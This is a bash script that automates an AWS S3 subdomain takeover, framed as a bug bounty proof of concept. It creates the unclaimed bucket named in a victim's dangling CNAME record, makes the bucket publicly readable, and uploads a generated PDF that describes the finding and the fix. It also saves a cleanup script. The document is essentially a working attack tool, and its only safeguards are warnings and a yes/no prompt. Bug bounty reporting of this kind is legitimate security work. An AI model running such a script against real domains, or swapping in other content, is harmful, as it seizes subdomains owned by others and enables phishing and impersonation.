#!/bin/bash
# AWS S3 Subdomain Takeover PoC - PDF Upload
# ONLY USE FOR AUTHORIZED BUG BOUNTY TESTING

echo "🔒 AWS S3 Subdomain Takeover - PoC with PDF"
echo "============================================"
echo ""
echo "⚠️  WARNING: Only use for authorized bug bounty programs!"
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo "❌ AWS CLI not found. Install with:"
    echo "   brew install awscli"
    echo "   aws configure"
    exit 1
fi

# Check if Python is installed (for PDF generation)
if ! command -v python3 &> /dev/null; then
    echo "❌ Python 3 not found."
    exit 1
fi

# Get input
read -p "Enter the vulnerable subdomain (e.g., old-app.company.com): " SUBDOMAIN
read -p "Enter the S3 bucket name from CNAME (e.g., old-app): " BUCKET_NAME
read -p "Enter AWS region (e.g., us-east-1, us-west-2): " REGION
read -p "Enter your bug bounty username: " RESEARCHER

echo ""
echo "📋 Summary:"
echo "   Vulnerable subdomain: $SUBDOMAIN"
echo "   S3 bucket name: $BUCKET_NAME"
echo "   Region: $REGION"
echo "   Researcher: $RESEARCHER"
echo ""
read -p "Continue? (yes/no): " CONFIRM

if [ "$CONFIRM" != "yes" ]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "📦 Step 1: Creating S3 bucket..."
aws s3 mb s3://$BUCKET_NAME --region $REGION

if [ $? -ne 0 ]; then
    echo ""
    echo "❌ Failed to create bucket."
    exit 1
fi

echo ""
echo "🔓 Step 2: Making bucket publicly readable..."
cat > /tmp/bucket-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadGetObject",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::$BUCKET_NAME/*"
    }
  ]
}
EOF

aws s3api put-bucket-policy --bucket $BUCKET_NAME --policy file:///tmp/bucket-policy.json

echo ""
echo "📝 Step 3: Generating PDF Proof-of-Concept..."

# Create Python script to generate PDF
cat > /tmp/generate_pdf.py << 'PYEOF'
import sys
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib import colors
from datetime import datetime

subdomain = sys.argv[1]
bucket_name = sys.argv[2]
region = sys.argv[3]
researcher = sys.argv[4]

doc = SimpleDocTemplate("/tmp/proof-of-concept.pdf", pagesize=letter)
story = []
styles = getSampleStyleSheet()

title_style = ParagraphStyle('CustomTitle', parent=styles['Heading1'], fontSize=24, textColor=colors.HexColor('#d9534f'), spaceAfter=30)
heading_style = ParagraphStyle('CustomHeading', parent=styles['Heading2'], fontSize=16, textColor=colors.HexColor('#333333'), spaceAfter=12)

story.append(Paragraph("🔒 AWS S3 Subdomain Takeover - Proof of Concept", title_style))
story.append(Spacer(1, 0.2*inch))
story.append(Paragraph("Vulnerability Details", heading_style))

details_data = [
    ['Vulnerable Subdomain:', subdomain],
    ['Service Type:', 'AWS S3 Bucket'],
    ['Bucket Name:', bucket_name],
    ['Region:', region],
    ['Discovered Date:', datetime.now().strftime('%Y-%m-%d')],
    ['Researcher:', researcher],
]

details_table = Table(details_data, colWidths=[2*inch, 4*inch])
details_table.setStyle(TableStyle([
    ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#fff3cd')),
    ('TEXTCOLOR', (0, 0), (-1, -1), colors.black),
    ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
    ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
    ('FONTSIZE', (0, 0), (-1, -1), 10),
    ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
    ('GRID', (0, 0), (-1, -1), 1, colors.grey),
]))

story.append(details_table)
story.append(Spacer(1, 0.3*inch))
story.append(Paragraph("What is Subdomain Takeover?", heading_style))

explanation = """This subdomain was pointing to a non-existent S3 bucket. An attacker could have created a bucket with the same name and hosted malicious content, enabling phishing attacks and brand impersonation."""
story.append(Paragraph(explanation, styles['BodyText']))
story.append(Spacer(1, 0.2*inch))

story.append(Paragraph("Proof of Concept", heading_style))
poc_text = """This PDF demonstrates control over the subdomain by claiming the S3 bucket. <b>No malicious actions have been taken.</b>"""
story.append(Paragraph(poc_text, styles['BodyText']))
story.append(Spacer(1, 0.2*inch))

story.append(Paragraph("Recommended Fix", heading_style))
remediation = """1. Remove the DNS CNAME record pointing to the unclaimed bucket<br/>2. If needed, reclaim the bucket in AWS Console<br/>3. Implement monitoring for dangling DNS records"""
story.append(Paragraph(remediation, styles['BodyText']))

doc.build(story)
print("✅ PDF generated successfully")
PYEOF

# Generate PDF
python3 /tmp/generate_pdf.py "$SUBDOMAIN" "$BUCKET_NAME" "$REGION" "$RESEARCHER"

echo ""
echo "📤 Step 4: Uploading PDF to S3..."
aws s3 cp /tmp/proof-of-concept.pdf s3://$BUCKET_NAME/proof-of-concept.pdf \
  --content-type "application/pdf" \
  --acl public-read

echo ""
echo "📤 Step 5: Creating CNAME file..."
echo "$SUBDOMAIN" > /tmp/CNAME
aws s3 cp /tmp/CNAME s3://$BUCKET_NAME/CNAME

echo ""
echo "✅ PoC Deployed!"
echo ""
echo "🌐 Access your PDF PoC at:"
echo "   https://s3.$REGION.amazonaws.com/$BUCKET_NAME/proof-of-concept.pdf"
echo "   Or: https://$BUCKET_NAME.s3.amazonaws.com/proof-of-concept.pdf"
echo ""
echo "📋 Next Steps:"
echo ""
echo "1. Verify the PDF is accessible:"
echo "   curl -I https://s3.$REGION.amazonaws.com/$BUCKET_NAME/proof-of-concept.pdf"
echo ""
echo "2. Check if subdomain resolves:"
echo "   curl http://$SUBDOMAIN/proof-of-concept.pdf"
echo ""
echo "3. Submit to bug bounty program with PDF link"
echo ""
echo "4. After confirmation, delete the bucket:"
echo "   aws s3 rb s3://$BUCKET_NAME --force"
echo ""
echo "💾 Saving cleanup command..."
cat > ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh << CLEANUP
#!/bin/bash
# Cleanup S3 bucket for $SUBDOMAIN takeover PoC
echo "Deleting S3 bucket: $BUCKET_NAME"
aws s3 rb s3://$BUCKET_NAME --force
echo "Done!"
CLEANUP
chmod +x ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh
echo "   Saved to: ~/Desktop/s3_cleanup_${BUCKET_NAME}.sh"
echo ""
echo "⚠️  Remember to delete this bucket after the vulnerability is confirmed!"
echo ""
